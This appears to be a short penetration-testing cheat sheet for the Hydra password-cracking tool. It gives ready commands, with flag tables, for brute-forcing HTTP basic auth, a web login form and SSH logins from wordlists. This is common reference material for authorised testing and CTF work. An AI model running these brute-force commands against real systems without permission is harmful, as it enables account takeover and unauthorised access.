---
title: "Hydra"
date: 2024-7-2
tags: ["Hydra", "Password Cracking", "Brute Force", "Authentication", "Web Exploitation", "Credential"]
---

### HTTP basic auth

```console
hydra -L <USERS_FILE> -P <PASSWORD_FILE> -s <TARGET_PORT> -f <TARGET> http-get /
```

```console
+-------------------------------------------+
| -s : port                                 |
| -L : usernames file                       |
| -P : passwords file                       |
| -f : exit when a login/pass pair is found |
+-------------------------------------------+
```

### Web Page Login Form

```console
hydra <TARGET> -l <USER> -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form '/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password'
```

```console
+-------------------------------------------+
| -l                 : username             |
| -P                 : wordlist             |
| http-post-form     : service              |
| /login.php         : action               |
| ^PASS^             : payload indicator    |
| Incorrect password : login failure string |
+-------------------------------------------+
```

### SSH with user:password wordlist

```console
hydra -C <USERS_PASSWORDS_FILE> ssh://<TARGET>
```
